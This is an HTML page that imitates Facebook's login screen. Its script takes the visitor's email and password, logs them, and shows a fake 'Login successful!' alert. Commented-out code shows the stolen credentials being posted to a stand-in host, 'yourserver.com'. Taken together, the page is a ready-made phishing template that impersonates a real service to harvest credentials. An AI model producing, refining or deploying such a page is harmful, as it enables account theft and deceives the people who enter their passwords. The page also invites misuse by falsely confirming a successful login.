 <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .login-container h1 {
            margin-bottom: 20px;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        .login-container button:hover {
            background-color: #166fe1;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Facebook</h1>
        <input type="email" id="email" placeholder="Email or Phone Number" required>
        <input type="password" id="password" placeholder="Password" required>
        <button onclick="submitForm()">Log In</button>
    </div>

    <script>
        function submitForm() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Here you would typically send the credentials to your server
            // For demonstration purposes, we'll just log them to the console
            console.log(`Email: ${email}`);
            console.log(`Password: ${password}`);

            // You can also send the data to your server using fetch or XMLHttpRequest
            // Example:
            // fetch('https://yourserver.com/login', {
            //     method: 'POST',
            //     headers: {
            //         'Content-Type': 'application/json'
            //     },
            //     body: JSON.stringify({ email, password })
            // }).then(response => response.json())
            //   .then(data => console.log(data))
            //   .catch(error => console.error('Error:', error));

            alert('Login successful!');
        }
    </script>
</body>
</html>
